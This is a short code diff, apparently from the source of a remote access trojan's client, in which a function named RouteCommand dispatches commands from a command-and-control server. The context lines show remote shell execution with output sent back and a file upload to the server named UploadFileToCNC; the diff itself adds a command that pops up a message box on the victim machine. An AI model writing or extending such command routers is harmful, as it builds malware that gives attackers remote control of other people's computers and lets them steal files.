@@ -22,6 +22,8 @@ void Gengar::RouteCommand(json cmd)
 {
 	if (cmd["cmd"] == "shell")
 		m_client.Send(m_machine.RunShellCommand(cmd["content"]));
+	else if (cmd["cmd"] == "msgbox")
+		m_machine.ShowMessageBox(cmd["title"], cmd["content"]);
 	else if (cmd["cmd"] == "download")
 		UploadFileToCNC(cmd["path"]);
 	else if (cmd["cmd"] == "upload")
